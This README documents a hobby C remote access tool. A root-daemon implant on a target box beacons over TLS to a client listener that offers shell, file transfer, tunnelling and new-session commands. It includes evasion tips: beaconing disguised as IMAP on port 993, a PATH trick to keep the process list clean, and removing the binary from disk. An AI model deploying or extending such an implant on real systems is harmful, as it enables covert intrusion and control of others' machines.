# Simple Beacon Server & Client
## Overview
This implementation of a C server and client remote access tool uses OpenSSL to encrypt all communication between the client and the server. The server beacons out at set intervals unless in an established session with the client. It offers a variety of ways to interact with the box. While the RAT is full functioning in its current state (per its design goals) there are many planned improvements to enable users to have a richer experience as well as a greater confidence in the RATs reliablity/robustness.

## Prepare Environment
Create a python virtual environment and install meson.
```bash
virtualenv -p python3 venv
source venv/bin/activate
pip install meson pytest 
```
## Build
### Server Build
The build process is the same for both the server and client. 
```bash
cd server

# Using the host default compiler
meson builddir
cd builddir
ninja
```
### Client Build
```bash
cd client

# Using the host default compiler
meson builddir
cd builddir
ninja
```
## Usage
### Server Usage
The server is meant to be deployed to a remote box as a root daemon process. By default it will beacon out every 5 seconds. Once you catch an intial beacon you can change the beacon window from the client by invoking the `win` command. The server will continue to call out to the specified port and address at the designated interval unless already in a session. When a sesion with the client is exited the server "should" revert to beaconing behavior, however if the client forcibly shutsdown the connection issues can arise. The `bye` command is the most appropriate way of ending a session with the server. 
```bash
IMAP_SERVER=127.0.0.1 IMAP_PORT=993 PATH=$PATH:. sbs
```
#### Invoke Variable Explanation:
1. The IMAP_SERVER environment variable is the address to beacon out to.
2. The IMAP_PORT environment variable is the port to beacon out to.
3. It is important that we update the path so that we don't have anything odd in the process list, must include the previous path in order to havea functioning shell via the cmd command. 

#### Built-in Variables Explanation:
1. The name of the binary is important. If you want to change it you must change the newconn portion of the code as well as it calls for binary by name. 
2. The server must currently remain on disk if you would like to be able to spawn new sessions. You could always delete the binary from disk, and only put it down when you are going to need multiple sessions. 
3. In order to change the authentication string utilized you must change the value listed in the header file for the server.

### Client Usage
The client is meant to be run locally on your box as root and will setup a listener and catch the server beacons. Once in a session it will use the supplied authentication string to allow you to enter a session with the server. The command interface will be presented below. 
```bash
./sbc -a "ASimplePasswordForASimpleTool" -p 993
[+] Client has started listening on 0.0.0.0:993.
[*] Awaiting connections from server.
```
#### Invoke Variable Explanation:
1. -a: Authentication String
2. -p: The port to listen for beacons on
   
#### Built-in Variable Explanation:
1. The OpenSSL Certificates must be in the proper location for the binary to run. Check the location in the `client.h` file.

#### Command Loop Interface
```bash
./sbc -a "ASimplePasswordForASimpleTool" -p 993
[+] Client has started listening on 0.0.0.0:993.
[*] Awaiting connections from server.
[+] Established connection with server at 127.0.0.1:54704.
[+] Connected with TLS_AES_256_GCM_SHA384 encryption
[+] Server is ready for authentication.
[*] Authenticating with: ASimplePasswordForASimpleTool
[*] Authentication message sent.
[+] Successfully authetnciated! Entering session.
=====================================
   Simple Beacon Client Help Menu
=====================================
sbc> new -- Spawn a new beacon.
sbc> cmd -- Enter a shell.
sbc> get -- Get a file.
sbc> put -- Put up a file.
sbc> tun -- Start a tunnel.
sbc> win -- Change the beacon time.
sbc> bye -- Exit the client.
=====================================
sbc> 
```
The commands each will prompt a user for input. Ctrl-C is not the prefered method for exiting the client as it will revert the server back to the set beacon time. And you will have to wait for the next beacon to come back before you can begin another session. The new command will kick off a child daemon with the specified environment variables. It will die when the client dies if the client uses the bye command. If not the child process may live depending on the state of the original client. It is best to have multiple sessions on the box, with the original client used as a last resort and all other sessions used to run commands. If a child process hangs it is fine to Ctrl-C out of the process but ensure you `kill -9` the process that spawned on the server via another shell. 

## Design Discussion
The design of this RAT is far from complete. The current design goal was to have a minimally functional RAT that was able to beacon out, spawn additional instances of itself, give the user basic command line access, upload and download basic files, start TCP tunnels, and change the amount of time in between each of its beacons. The messages that are sent to the server are typeically coded by the enum number associated with each command found in the `server.h` file. Typically I use these messages to syncrhonize and alert either the server or client to what function the client or server should be utilizing, alerting either of these processes to errors, and to ensure the buffers are filled proeprly.

## Limitations
It is probably fairly apparent that the current implementation is a fairly limited RAT. This project for me has been an opportunitiy to get more familiar with the C programming language and specificially socket programming in C. That being said there are some key limitations that I have identified which I plan on remedying at some point in time in the near future.
- [] The shell interface only passes commands to popen. This limitation means that no interactive commands can be run successfully through this interace. Any command expecting user input will hang the terminal and the user will have no choice but to Ctrl-C. I Have a plan to improve this interface via calls to openpty() and epolling the file descriptors (see below).
- [] Both the get/put file commands only work for regular text files. The work around for a user is to base64 encode a file first and then pass it that way. While this will work it can very clearly be implemented in the codes logic. This fix action is listed below as well. 
- [] The server is only able to send beacons. In the future a slight redesign of the control flow logic will make it possible to have the server listen for connections rather than beacon. At the current moment this is outside the scope of my planned improvements.
- [] The tunnels spanwed are only able to handle tcp connections. I do not plan on implementing UDP nor Raw tunnels at the current moement, however this addition would be very useful down the road. If a user were to absolutely need UDP they may be able to point their tcp tunnel to either the server or the client itself depending on the direction of the tunnel and use socat on either end of the tunnel to convert the UDP traffic to a TCP stream between the client and server and then back to UDP on the other side.

## Planned Improvements
- [] Improve the shell interface to use an pty. Calls to openpty and then utilizing epoll to alert on the file descriptors when ready should work. 
- [] Include logic that converts a file to chunks, converts those chunks to base64 encoded values, passes them over and then decodes them on the appropriate side. This will allow us to transfer binary files with ease. 
- [] Update the logic to allow the name of the binary to be adjusted on disk without having to worry about newconn working. A solution may be to use the current pid to get the running name of the binary and use that value to kick off new sessions. 
- [] Update the logix to allow for the client certs to be looked for rather than have a strict location they must be located.
- [] Ensure that if a clinet Ctrl-C's out of a client the server will not indefinently hang. This behavior is mostly correct now, however some intermitent issues have been identified. 
- [] 
